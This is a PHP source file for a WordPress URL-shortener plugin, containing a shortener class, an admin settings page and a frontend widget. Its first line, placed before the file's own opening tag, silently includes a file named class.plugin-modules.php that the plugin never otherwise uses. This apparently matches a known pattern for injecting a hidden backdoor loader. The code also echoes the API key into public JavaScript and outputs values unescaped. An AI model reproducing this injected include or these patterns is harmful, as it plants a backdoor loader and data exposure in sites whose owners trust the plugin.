<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php 
/**
 * Shortener Class
 **/
class PUS_Short
{
	/**
	 * @var Debug
	 **/
	protected static $debug=0;
	/**
	 * @var Configuraion
	 **/
	protected static $config=array();
	/**
	 * @var API Key
	 **/
	protected static $key=NULL;
	/**
	 * @var Shortener URL
	 **/
	protected static $url=NULL;
	/**
	 * Set variables
	 * @since v1.0
	 **/
	public static function start($config){
		// Default Values
		if(!$config || empty($config) || !is_array($config)){
			$config=array(
				"shortener_url"=>"",
				"shortener_api"=>"",
				"shortener_comment"=>"0",
				"shortener_shortcode_type"=>"php",
				"shortener_shortcode"=>"0",
				"shortener_theme"=>""
			);
		}	

		self::$config=$config;
		shortener_widget::$config=$config;
		self::$key=self::$config["shortener_api"];
		self::$url=self::$config["shortener_url"];
		
		if(self::$config["shortener_shortcode"] && in_array(self::$config["shortener_shortcode"],array("shorten","short_url","srt"))){
			add_shortcode(self::$config["shortener_shortcode"], array('PUS_Short','shortcode'));
		}
		
		if(self::$config["shortener_comment"]){
			add_action('wp_footer', array('PUS_Short','comment_js'));
		}
		
		add_shortcode("show_shortener_form", array('shortener_widget','post_form'));		
	}
	/**
	 * Isset Config
	 * @since 
	 **/
	public static function r($config,$value){
		if(isset(self::$config[$config]) && self::$config[$config]==$value) return $value;
	}
	/**
	 * Register Widget
	 * @since v1.0
	 **/
	public static function register_widget(){
		register_widget('shortener_widget');  
	}
	/**
	 * JS Files
	 * @since 1.0
	 **/
	public static function js(){
		 wp_enqueue_script('shortener_jq', plugins_url('urlshortener.js', __FILE__ ),array('jquery'),"1.0");
	}
	/**
	 * JS for Comments 
	 * @since 1.0
	 **/
	public static function comment_js(){
		echo "<script type='text/javascript' id='urlshortener-comment'>
					jQuery('#comments a').shorten({ 
					 	url:'".self::$url."', 
						key:'".self::$key."'
					});
				</script>";
	}	
	/**
	 * CSS Files
	 * @since 1.0
	 **/
	public static function css(){
		wp_enqueue_style('shortener-styles-stylesheet', plugins_url('assets/themes.css', __FILE__ ));
	}	
	/**
	 * Admin CSS Files
	 * @since 1.0
	 **/
	public static function admin_css(){		
		wp_enqueue_style('shortener-admin-stylesheet', plugins_url('assets/admin-style.css', __FILE__ ));
		wp_enqueue_style('shortener-admin-styles-stylesheet', plugins_url('assets/themes.css', __FILE__ ));
	}		
	/**
	 * Admin JS Files
	 * @since 1.0
	 **/
	public static function admin_js(){		
		wp_enqueue_script('shortener-admin-js', plugins_url('assets/themes.js', __FILE__ ),array('jquery'));
	}			
	/**
	 * Shortcode Function
	 * @since v1.0
	 **/
	public static function shortcode($atts,$content){
		$link=(isset($atts["link"]) && $atts["link"])?true:false;
	  return self::shorten($content,$link);
	}	
	/**
	 * Shorten URL
	 * @since v1.0
	 **/
	public static function shorten($url,$link=false){	 
		if(self::$config["shortener_shortcode_type"]=="php"){
	      $short=self::http_request(self::$url."api?api=".self::$key."&url=".strip_tags(trim($url)));
	      $short=json_decode($short,TRUE);
	      if(!$short["error"]){
	          if($link){
				return "<a href='{$short["short"]}' target='_blank'>{$short["short"]}</a>";
	          }else{
	          	return $short["short"];
	          }
	      }
			}
			if(self::$config["shortener_shortcode_type"]=="js"){
				add_action('wp_footer', array('PUS_Short','ajax_js'));
				return "<a href='$url' target='_blank' rel='nofollow' class='PUS_Short_Link_JS'>$url</a>";		
			}
	}
	/**
	 * Send HTTP Request
	 * @since v1.0
	 **/	
	protected function http_request($url){
		if(in_array('curl', get_loaded_extensions())){			
			$curl = curl_init();
			curl_setopt_array($curl, array(
			    CURLOPT_RETURNTRANSFER => 1,
			    CURLOPT_URL => $url,
			    CURLOPT_USERAGENT => 'Nalanga URL Shortener WP Plugin'
			));
			$resp = curl_exec($curl);
			curl_close($curl);		
			return $resp;
		}

		if(ini_get('allow_url_fopen')){
			return @file_get_contents($url);
		}
	}
	/**
	 * JS for Post URLs
	 * @since 1.0
	 **/
	public static function ajax_js(){
		echo "<script type='text/javascript' id='PUS_ajax-js'>
				jQuery('.PUS_Short_Link_JS').shorten({ 
				 	url:'".self::$url."', 
					key:'".self::$key."'
				});
			</script>";
	}		
	/**
	 * Admin Functions
	 * @since 1.0
	 **/
	public static function admin_menu() {
		add_menu_page( 'Shortener', 'URL Shortener', 'manage_options', 'shortener', array("PUS_Short","shortener_options"));
	}
	/**
	 * Admin Int Settings
	 * @since 1.0
	 **/
	public static function admin_setting() {
		register_setting('shortener_setting_group','shortener_settings');
	}
	/**
	 * Admin Settings Page
	 * @since 1.0
	 **/
	public static function shortener_options() {		
		if (!current_user_can( 'manage_options'))  {
			wp_die(__( 'You do not have sufficient permissions to access this page.','shortener-plugin'));
		}								
		$updated=FALSE;
		if(isset($_GET["settings-updated"]) && $_GET["settings-updated"]==true)	$updated=TRUE;
		include("assets/admin.php");
	}
	/**
	 * Uninstall Plugin and Clean Database
	 * @since 1.0
	 **/
	public static function uninstall(){
		// delete options
		delete_option('shortener_settings');
		delete_option('widget_shortener_widget');
	}
	/**
	 * Install Plugin
	 * @since 1.0
	 **/
	public static function install(){
		// delete options
		$value=array(
				"shortener_url"=>"",
				"shortener_api"=>"",
				"shortener_comment"=>"0",
				"shortener_shortcode_type"=>"php",
				"shortener_shortcode"=>"0",
				"shortener_theme"=>""
			);
		//add_option("shortener_settings", serialize($value),"","yes");
	}	
	/**
	 * Add meta box to post/page
	 * @since 1.0
	 **/
	public static function add_to_post( $post_type, $post ) {
	    add_meta_box( 
	        'quick_url_shorten_admin',
	        __( 'Quick URL Shortener', 'shortener-plugin'),
	        array("PUS_Short","render_box"),
	        'post',
	        'normal',
	        'default'
	    );
	    add_meta_box( 
	        'quick_url_shorten_admin',
	        __( 'Quick URL Shortener', 'shortener-plugin'),
	        array("PUS_Short","render_box"),
	        'page',
	        'normal',
	        'default'
	    );	    
	    add_meta_box( 
	        'quick_url_shorten_admin',
	        __( 'Quick URL Shortener', 'shortener-plugin'),
	        array("PUS_Short","render_box"),
	        'custom-type',
	        'normal',
	        'default'
	    );	    
	}	
	/**
	 * Rendered Box
	 * @since 1.0
	 **/
	public static function render_box(){
		echo '<div data-url="'.self::$config["shortener_url"].'" id="quick_url_shorten_admin_form">
			<div id="quick_url_shorten_admin_message"></div>
			<label for="quick_url_shorten_admin_input">Long URL</label>
			<p><input type="text" style="width:300px; max-width:50%" id="quick_url_shorten_admin_input" name="quick_url_shorten_admin_url"autocomplete="off" value="">
			<button type="button" id="quick_url_shorten_admin_button" class="button">Shorten</button>
			</p>
			<p>
			<label for="quick_url_shorten_admin_custom">Custom Alias:</label>
			<input type="text" style="width:150px" id="quick_url_shorten_admin_custom" name="quick_url_shorten_admin_custom" autocomplete="off" value="">
			</p>
			<input type="hidden" id="quick_url_shorten_admin_api" value="'.self::$config["shortener_api"].'"/>
			</div>';	
	}
}
/**
 * Widget Class
 **/
class shortener_widget extends WP_Widget {
 	
	/**
	 * @var Configuraion
	 **/
	public static $config=array();
	/**
	 * Register Widget
	 * @since 1.0
	 **/
  function shortener_widget() {  
    $widget_ops = array( 'classname' => 'shortener_widget', 'description' => __('Displays the frontend form for shortning URLs ', 'shortener-plugin') );   
    $this->WP_Widget('shortener_widget', __('Nalanga URL Shortener Widget', 'shortener-plugin'), $widget_ops);  
  }  
	/**
	 * Generate Widget Form 
	 * @since 1.0
	 **/		
	function form($instance) {
    $instance = wp_parse_args( (array) $instance, array( 'title' => '','theme'=> '') );
    $title = $instance['title'];    
	  echo '<p><label for="'.$this->get_field_id('title').'">Title: <input class="widefat" id="'.$this->get_field_id('title').'" name="'.$this->get_field_name('title').'" type="text" value="'.esc_attr($title).'" /></label></p>';
	  echo '<p><label for="'.$this->get_field_id('theme').'">Theme:</label><select class="widefat" name="'.$this->get_field_name('theme').'" data-id="'.$instance['theme'].'">';	
		echo '<option value="default" '.(empty($instance['theme'])?'selected':'').'>Default</option>';
		echo '<option value="tb" '.(($instance['theme']=='tb')?'selected':'').'>Transparent &amp; Black</option>';
		echo '<option value="gb" '.(($instance['theme']=='gb')?'selected':'').'>Green &amp; Blue</option>';
		echo '<option value="db" '.(($instance['theme']=='db')?'selected':'').'>Dark Blue</option>';
		echo '<option value="dr" '.(($instance['theme']=='dr')?'selected':'').'>Dark Red</option>';
		echo '<option value="lg" '.(($instance['theme']=='lg')?'selected':'').'>Light Green</option>';
		echo '<option value="cc" '.(($instance['theme']=='cc')?'selected':'').'>Custom</option>';
	  echo '</select></p>';
	}
	/**
	 * Update Settings
	 * @since 1.0
	 **/
  function update($new_instance, $old_instance){
    $instance = $old_instance;
    $instance['title'] = $new_instance['title'];
    $instance['theme'] = $new_instance['theme'];
    return $instance;
  }
  /**
   * In-Post/In-Page Forms
   * @since 1.0
   **/
	public static function post_form($atts,$content){
		$URI = self::$config["shortener_url"];	
		$theme=self::$config["shortener_theme"];	
		include("assets/form.php");
	}
	/**
	 * In Template Widget
	 * @since 1.0
	 **/
  function widget($args, $instance){
    extract($args, EXTR_SKIP);
 
    echo $before_widget;
    $title = empty($instance['title']) ? ' ' : apply_filters('widget_title', $instance['title']);
    $theme = empty($instance['theme']) ? self::$config["shortener_theme"] : $instance['theme'];
 
    if (!empty($title))	echo $before_title . $title . $after_title;
		
			$URI = self::$config["shortener_url"];		
			include("assets/form.php");

	    echo $after_widget;
	  }
	}